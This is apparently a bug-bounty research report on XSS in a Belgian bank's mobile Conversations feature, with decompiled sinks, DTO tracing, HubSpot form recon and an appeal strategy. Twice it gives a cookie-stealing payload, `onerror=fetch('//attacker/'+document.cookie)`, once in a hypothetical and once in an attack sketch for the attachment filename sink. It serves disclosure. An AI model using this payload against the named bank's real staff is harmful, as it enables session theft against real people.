# Track B — Conversations-XSS escalation (no-account paths)

**Headline verdict: PARTIAL — leaning STRONG on architectural framing.**

Task 1 closes on its own terms: `SenderFullName` is server-derived from ItsMe/EID KYC
data and is not customer-editable through any client-observable API. But the sweep in
Task 3 surfaced two independent findings that together undermine the triager's
"self-XSS that cannot be used to exploit other users" closure of the original submission:

1. **`ReceiverType` / `SenderType` = `OLBUSER` is a declared constant** in the mobile
   app's own API contract (`ReceiverTypeCodes.cs:11`, `SenderTypeCodes.cs:11`), and the
   Conversations UI branches on `A_0.ReceiverType == "OLBUSER"` and
   `A_0.SenderType == "OLBUSER"` in `ShowConversationDetailUIProcess.cs:345,365`. The
   mobile client is architected to render `OLBUSER → OLBUSER` messages through the
   same unsanitised HTMLHelper pipeline — meaning the "self-XSS" framing rests on the
   assumption that OLBUSER→OLBUSER is *never* server-side-enabled, which is a triager
   assertion, not an architectural fact.
2. **`AttachmentDto.FileName` is customer-controllable at upload and rendered raw** —
   an entirely different DTO field from the `Body` sink the closed submission cited.
   `RegisterConversationUIProcess.cs:1041` and `ShowConversationDetailUIProcess.cs:4268`
   set `FileName = text` from a picker with no encoding, and `HTMLHelper.cs:904` emits
   `<div>{att.FileName}</div>` with no encoding. Every conversation renders the
   attachment list of the counterpart, so a `<img src=x onerror=…>.pdf` filename fires
   in whoever opens the message next — including advisor / helpdesk clients that share
   the same DTO surface.

Task 2 (`templateMergeContent`) closes cleanly at the client boundary: the field is
defined on `ConversationMessageDto` but has zero read-sites in the mobile client
(`grep -c "TemplateMerge" HTMLHelper.cs == 0`). Any templating happens server-side and
is not observable from the extracted DLLs.

Task 4 (marketing forms) closes for the direct question asked: every contact / klacht
/ feedback form on `www.bankvanbreda.be` and `www.bankdekremer.be` is rendered by
`hbspt.forms.create()` (HubSpot portalId **7148719**, region **eu1**) and submits to
HubSpot's SaaS backend. They do not funnel into the mobile Conversations helpdesk
queue directly from the browser; any bridge to the bank's internal ticketing is
server-side and outside a GET-only recon scope.

**Recommended appeal framing:** re-open on the basis of Task 3 finding #2
(`att.FileName` raw sink — a *new* injection point, distinct from `Body`), plus Task 3
finding #1 (the "self-only" assumption is not backed by the client architecture; the
receiver-type enum admits OLBUSER→OLBUSER by construction and the render pipeline
handles it). The triager should be asked to either (a) confirm from the server side
that OLBUSER→OLBUSER routing is disabled and that `att.FileName` is sanitised
server-side before storage, or (b) issue test credentials so the researcher can
demonstrate the filename payload firing on a second (test-only) party.

---

## Task 1 — `SenderFullName` provenance

**Verdict: `server-derived only → SenderFullName path closes here` for the
"customer directly edits their sender name" angle.**

### Evidence

**Sink (raw HTML render, no encoder):**

- `HTMLHelper.cs:391` — `GetHTMLFullScreenMessageSource(ConversationMessageDto msg)`:
  ```csharp
  return $"\n<article>\n  <header>\n    {msg.SenderFullName}\n    <span>{msg.Date:…}</span>\n  </header>\n  <section>\n    {text}\n    {WebUtility.HtmlDecode(msg.Body)}\n  </section>\n</article>";
  ```
  Body-context (`<header>`) HTML injection; and note `WebUtility.HtmlDecode(msg.Body)` —
  an **active decode** of any HTML entities in the body, so even server-side entity
  encoding is undone by the client.

- `HTMLHelper.cs:703 + 793` — `GetHTMLChatMessageSource(ConversationMessageDto msg)`:
  ```csharp
  text3 = msg.DisplaySenderFullName;   // (or DisplayReceiverFullName on the else branch)
  …
  return $"\n<li>\n  {text}\n  <span>{text2}{text3}</span><blockquote {text4}>{WebUtility.HtmlDecode(msg.Body)}…</blockquote>\n  <span>{msg.Date…}</span>\n</li>";
  ```
  Body-context (`<span>`); same active `HtmlDecode` on `msg.Body`.

**Send-side (proof the client cannot supply SenderFullName):**

- `AddMessage.cs` — only four fields: `replyToMessageID`, `replyToConversationID`,
  `body`, `attachmentIDs`. No `senderFullName`, `senderPartyID`, or profile field.
- `CreateConversation.cs` — five fields: `categoryCOID`, `receiverTypeCOID`,
  `subject`, `body`, `attachmentIDs`. Same story.
- `Services/Server/Communication.cs:4348` —
  `CreateConversation(string body, string subject, string conversationCategoryCOID, string receiverTypeCOID, List<Guid> attachmentIDs)` — the client-facing signature has no name argument.

**Profile-side (proof the customer cannot edit their own display name):**

- `PersonDto.cs` — the ModifyPerson* onboarding DTOs expose only
  `partnerFirstName / partnerLastName / maritalStatusCOID / titleCOID /
  fiscalCountryCOID / nationalityCOID / tin / socialSecurityNumber /
  birthCountryCOID / …`. Notably absent: the user's own `firstName` / `lastName` /
  `fullName` / `displayName`. Those are server-owned and derived from KYC.
- `ConfirmItsmeDataForCustomerOnboarding.cs` carries only `processID` — the client
  does not re-send the ItsMe identity payload; it only confirms the pre-signed
  government-issued name.
- The only Update / Modify DTOs the app exposes are for phone number, pincode,
  bio-security enablement, and card settings — none carrying a display name.

### Attack sequence (would-have-been, if the field had been customer-editable — it isn't)

If `SenderFullName` had been client-set, the sequence would have been:
1. Attacker sets their own profile display name to `<img src=x onerror=fetch('//attacker/'+document.cookie)>`.
2. Attacker opens a conversation with the advisor. On the advisor's side of the
   thread, the mobile app (or the advisor dashboard sharing the DTO) renders the
   `<header>{msg.SenderFullName}</header>` chunk from `GetHTMLFullScreenMessageSource`.
3. Payload fires in the advisor's session; DOM access to any WebView-exposed
   `jsBridge` native interface follows.

That path is closed because step 1 has no API — the server owns the name.

Evidence files: `03-xss-escalation-evidence/HTMLHelper_GetHTMLFullScreenMessageSource.cs`,
`03-xss-escalation-evidence/HTMLHelper_GetHTMLChatMessageSource.cs`,
`03-xss-escalation-evidence/AddMessage.cs`,
`03-xss-escalation-evidence/CreateConversation.cs`,
`03-xss-escalation-evidence/ConversationMessageDto.cs`.

---

## Task 2 — `templateMergeContent` and bank-authored template render path

**Verdict: `no customer-controllable value reaches templateMergeContent` — and the
field has no client read-site at all.**

### Evidence

- The DTO defines the field: `ConversationMessageDto.cs:1958` — `[JsonProperty("templateMergeContent", …)] public string TemplateMergeContent`.
- Every mobile-client hit for `TemplateMergeContent` / `MergeContent` in the
  decompiled sources is either (a) the DTO definition above or (b) demo data setting
  it to `null`:
  ```
  grep -RIln "TemplateMergeContent" ~/bvb_apks/bvb_decompiled_cs/
  → BVB.EOS.…Services.Demo.Models/Data.cs   (6× "TemplateMergeContent = null,")
  → BVB.EOS.…Services.ApiServices.App.Contracts/ConversationMessageDto.cs
  ```
- `HTMLHelper.cs` — the only HTML renderer for the Conversations WebView —
  has **zero** hits for `TemplateMerge` / `MergeContent`
  (see `03-xss-escalation-evidence/HTMLHelper_TemplateMerge_hitcount.txt`, value `0`).
- Therefore the mobile client's render pipeline never inspects
  `TemplateMergeContent`. Any template merge is server-side, upstream of what the
  client receives as `msg.Body`, and cannot be observed from these DLLs.

### Related customer-editable field: `CreateUserDefinedNotificationDto`

The brief flagged `CreateUserDefinedNotificationDto` as a candidate. The DTO has two
customer-authored strings: `textCriterium` (a text filter for the trigger) and
`notificationText` (the actual notification body). Neither reaches any HTMLHelper
function in the mobile client — notifications are rendered through Xamarin.Forms
label bindings, which HTML-escape by default. See
`03-xss-escalation-evidence/CreateUserDefinedNotificationDto.cs`.

---

## Task 3 — DTO sweep: customer-editable strings → WebView sink

**Verdict: TWO new leads that were not part of the closed submission.**

### Every raw HTML sink in `HTMLHelper.cs`

| # | Sink location | Interpolated field | Render context | Set-side origin | Set-side encoding | Who sees it | Cross-user? |
|---|---|---|---|---|---|---|---|
| 1 | `HTMLHelper.cs:391` (`GetHTMLFullScreenMessageSource`) | `msg.SenderFullName` | `<header>` body | Server, from ItsMe/EID KYC | N/A — server-derived | Recipient of the message | **No** — server-derived; not customer-controllable. |
| 2 | `HTMLHelper.cs:391` (`GetHTMLFullScreenMessageSource`) | `WebUtility.HtmlDecode(msg.Body)` | `<section>` body | Customer via `AddMessage.body` / `CreateConversation.body` | None client-side; **and the client actively HtmlDecodes on render** | Recipient (BRANCH / EMPLOYEE / HELPDESK / OLBUSER) | **Architecturally yes**, closed as OOS (self-XSS) but see §"OLBUSER→OLBUSER" below. |
| 3 | `HTMLHelper.cs:793` (`GetHTMLChatMessageSource`, outbound branch) | `msg.DisplaySenderFullName` | `<span>` body | Server-derived (same KYC source as `SenderFullName`) | N/A | Recipient | **No** — server-derived. |
| 4 | `HTMLHelper.cs:793` (`GetHTMLChatMessageSource`, inbound branch) | `msg.DisplayReceiverFullName` | `<span>` body | Server-derived | N/A | Sender-side re-render | No |
| 5 | `HTMLHelper.cs:793` (`GetHTMLChatMessageSource`) | `WebUtility.HtmlDecode(msg.Body)` | `<blockquote>` body | Same as row 2 | Same as row 2 | Same as row 2 | Same as row 2 |
| 6 | **`HTMLHelper.cs:904` (`GetHTMLChatAttachmentSource`)** | **`att.FileName`** | **`<div>` body** | **Customer at upload time via `SelectOrScanDocumentUIProcess.m()` → `AttachmentDto.FileName = text` (`ShowConversationDetailUIProcess.cs:4268`, `RegisterConversationUIProcess.cs:1041`)** | **None** — filename is taken verbatim from the OS document picker / scan pipeline | **Anyone rendering the recipient's attachment list — including the advisor client** | **YES — new lead** |
| 7 | `HTMLHelper.cs:1219` (`GetHTMLChatDocumentSource`) | `doc.Description` | `<div>` body | Bank / archive metadata | N/A | Customer receiving bank-authored documents | No — bank-authored source only |
| 8 | `HTMLHelper.cs:1474` (`GetHTMLChatDocumentPackageSource`) | `documentPackage.Description` | `<div>` body | Bank / archive metadata | N/A | Customer receiving bank-authored documents | No — bank-authored source only |

Additional attachment-context detail: `att.AttachmentID.ToString()` is interpolated
into a `javascript:` URI at line 904 — script-context, but the value is a `Guid`, so
non-injectable.

### Top-3 highest-EV candidates

#### #1 — `AttachmentDto.FileName` → raw `<div>` render on the recipient's client (NEW)

- **Set path:** client uploads via `App.Services.Communication.CreateAttachment(this.m_d.ToFileInfo(), "MESSAGE")` after populating `FileName = text` from a picker (`ShowConversationDetailUIProcess.cs:4264-4272`, `RegisterConversationUIProcess.cs:1035-1045`).
- **Round-trip:** the uploaded filename appears verbatim on the recipient's
  `ConversationMessageDto.Attachments[i].FileName` (same DTO type used both directions).
- **Sink:** `<div>{att.FileName}</div>` at `HTMLHelper.cs:904` — no encoder, no
  regex-strip, no `HtmlEncode`.
- **Attack sketch:** attacker uploads a picker-name payload
  (`<img src=x onerror=fetch('//attacker/'+document.cookie)>.pdf`; a filename with
  bracketed characters is legal on Android's document picker and iOS' Files
  provider). Server accepts the filename (unverified; would need a live send).
  When the advisor (or a co-listed OLBUSER recipient) opens the conversation, the
  attachment list re-renders through `GetHTMLChatAttachmentSource`, and the
  payload fires in that WebView context — with the same `AllowFileAccessFromFileURLs=true` /
  `jsBridge` exposure the original submission cited.

#### #2 — The "self-XSS" reasoning is not backed by the client's own architecture (NEW angle on the closed sink)

- **Constants proved:** `SenderTypeCodes.User = "OLBUSER"` and
  `ReceiverTypeCodes.User = "OLBUSER"` are both first-class values in the API
  contract (`SenderTypeCodes.cs:11`, `ReceiverTypeCodes.cs:11`), alongside
  `EMPLOYEE`, `BRANCH`, `HELPDESK`.
- **Render pipeline handles OLBUSER as inbound sender:** `HTMLHelper.cs:829`
  computes `flag = msg.SenderType == "OLBUSER";` and branches the display block on
  it — meaning the developers explicitly designed for the "inbound from another
  OLBUSER" case.
- **Consumer already checks receiver-type OLBUSER:**
  `ShowConversationDetailUIProcess.cs:365` — `return A_0.ReceiverType == "OLBUSER";`
  — a helper predicate is defined for the OLBUSER-recipient case.
- **The `HtmlDecode` on `msg.Body` is architecturally hostile:** even if the
  server *does* HTML-entity encode customer-authored bodies as a defense (which is
  the standard advice), the mobile client **actively reverses it** via
  `WebUtility.HtmlDecode` (line 391 and line 793). This is not a bug in one place —
  it's the client's declared contract.
- **Framing for the appeal:** the OOS closure implicitly assumes OLBUSER→OLBUSER
  is server-side disabled. That assumption is a triager assertion, not a
  client-observable fact. The client is *built* for that case. The appeal should
  ask the triager to affirm from the server-side whether OLBUSER→OLBUSER
  conversation creation is disabled — and, regardless of the answer, to justify
  keeping `WebUtility.HtmlDecode(msg.Body)` in a codebase where the same DTO is
  potentially rendered by more than one party.

#### #3 — `msg.Body` inbound from EMPLOYEE / BRANCH / HELPDESK (bank-to-customer XSS is architecturally unsanitised too)

- Same sinks, opposite direction: an advisor who accidentally pastes HTML from a
  ticket template, or (worst case) a compromised advisor account, would deliver
  raw HTML into every downstream customer's WebView. Not a customer-side attack,
  but it's the flip side of the same lack of sanitisation and worth naming in the
  appeal for completeness.

Evidence files:
`03-xss-escalation-evidence/HTMLHelper_GetHTMLChatAttachmentSource.cs`,
`03-xss-escalation-evidence/AttachmentDto.cs`,
`03-xss-escalation-evidence/CreateAttachment.cs`,
`03-xss-escalation-evidence/FileInfoDto.cs`,
`03-xss-escalation-evidence/ShowConversationDetailUIProcess_attachment_upload.cs`,
`03-xss-escalation-evidence/RegisterConversationUIProcess_attachment_upload.cs`,
`03-xss-escalation-evidence/SenderTypeCodes.cs`,
`03-xss-escalation-evidence/ReceiverTypeCodes.cs`.

---

## Task 4 — Public unauth intake forms

**Verdict: no direct funnel from the marketing forms into the mobile Conversations
render pipeline observable from GET-only recon. Every form on the two marketing
sites is a HubSpot-hosted form.**

### Inventory (GET-only, User-Agent `Mozilla/5.0 (compatible; security-research)`, ≤1 req/sec)

| page URL | form action | destination host | field list source | likely backend |
|---|---|---|---|---|
| `https://www.bankvanbreda.be/klantentevredenheid/registreer-uw-klacht` | (JS-injected) | `forms-eu1.hsforms.com` / `forms.hsforms.com` | `hbspt.forms.create({ portalId:'7148719', formId:'039d7ff7-7a6c-441f-8f23-a39b1059e24c', region:'eu1' })` | HubSpot CRM (Marketing Hub) |
| `https://www.bankvanbreda.be/contact/stel-een-vraag` | (JS-injected) | same as above | `formId: 'f953d56f-f1d9-4aff-bc49-e56b5f30f156'` | HubSpot CRM |
| `https://www.bankvanbreda.be/feedback` | (JS-injected) | same | `formId: 'f344dce0-53f0-45e2-8690-dd77ddf42a26'` | HubSpot CRM |
| `https://www.bankdekremer.be/contacteer-ons` | (JS-injected) | same | `formId: 'a65ca2f3-270d-4638-b8f3-e448573046c6'` | HubSpot CRM |
| `https://www.bankvanbreda.be/contact/telefonische-afspraak` | none in HTML | — | no `hbspt.forms.create` on page | Static contact info + JS-embed of the `stel-een-vraag` form |
| `https://www.bankvanbreda.be/contact/videoafspraak` | none in HTML | — | no `hbspt.forms.create` on page | Static contact info |
| `https://www.bankvanbreda.be/helpdesk/helpdesk-customer-care` | none in HTML | — | no `hbspt.forms.create` on page | Static support content only |
| `https://www.bankdekremer.be/online/helpdesk` | none in HTML | — | no `hbspt.forms.create` on page | Static support content only |

Zero `<form>` tags exist in the served HTML on any of the twelve fetched pages —
every form is inserted at runtime by the HubSpot embed script
(`js-eu1.hsforms.net`), which loads a form definition from and submits to HubSpot's
own `api-eu1.hsforms.com` and `forms-eu1.hsforms.com` endpoints. HubSpot itself is
out-of-scope for this brief.

### Cross-reference to mobile Conversations backend

- The mobile Conversations backend lives under bank-internal hosts (see Track A2 —
  `xs2a-api-web.bankvanbreda.be` and the app-service base).
- The marketing forms land in HubSpot portal **7148719** (region eu1); customer
  service uses HubSpot as the CRM front-end. Any bridge from HubSpot to the
  mobile Conversations queue is a server-side sync we cannot observe from a
  GET-only unauth vantage — there is no bank-internal endpoint referenced by any
  of the fetched marketing pages that would suggest a shared render pipeline with
  the mobile app.

### "Worth actively testing" (if credentials become available; **not** attempted here)

1. `registreer-uw-klacht` (formId `039d7ff7-…`) — compliance-driven complaint
   intake. Regulator obligation forces a human read on every submission; any
   internal ticket viewer that syncs HubSpot text and renders it in a browser
   without escaping is a candidate. Fields are HubSpot-defined — the form
   definition would need to be pulled from
   `https://api-eu1.hsforms.com/…/7148719/039d7ff7-…` to enumerate them (HubSpot
   host, out of the current brief).
2. `stel-een-vraag` (formId `f953d56f-…`) — the general question intake; broadest
   readership, so a good "does anywhere strip the payload before render" pivot.

Raw HTML for every fetched page is in `03-recon-forms/pages/`; parsed
inventory in `03-recon-forms/forms-inventory.txt`; sitemap URL lists in
`03-recon-forms/bvb-urls.txt` and `03-recon-forms/bdk-urls.txt`.

---

## Deliverables index

- `03-xss-escalation.md` — this file
- `03-xss-escalation-evidence/`:
  - `HTMLHelper_GetHTMLFullScreenMessageSource.cs` — Task 1 sink #1
  - `HTMLHelper_GetHTMLChatMessageSource.cs` — Task 1 sink #2 + Task 3 branch on `SenderType == "OLBUSER"`
  - `HTMLHelper_GetHTMLChatAttachmentSource.cs` — Task 3 sink #6 (`att.FileName`)
  - `HTMLHelper_TemplateMerge_hitcount.txt` — Task 2 "0 hits" proof
  - `AddMessage.cs`, `CreateConversation.cs` — send-side DTOs (Task 1)
  - `ConversationMessageDto.cs` — receive-side DTO (Tasks 1 + 2)
  - `AttachmentDto.cs`, `CreateAttachment.cs`, `FileInfoDto.cs` — attachment DTOs (Task 3 #1)
  - `ShowConversationDetailUIProcess_attachment_upload.cs`, `RegisterConversationUIProcess_attachment_upload.cs` — client sites that set `FileName = text`
  - `SenderTypeCodes.cs`, `ReceiverTypeCodes.cs` — `OLBUSER` first-class constants (Task 3 #2)
  - `CreateUserDefinedNotificationDto.cs` — brief-listed candidate that closed
- `03-recon-forms/`:
  - `bvb-robots.txt`, `bvb-sitemap.xml`, `bvb-urls.txt` — bankvanbreda.be crawl inputs
  - `bdk-robots.txt`, `bdk-sitemap.xml`, `bdk-urls.txt` — bankdekremer.be crawl inputs
  - `pages/*.html` — raw HTML of the twelve fetched marketing pages
  - `forms-inventory.txt` — parsed form / HubSpot ID inventory
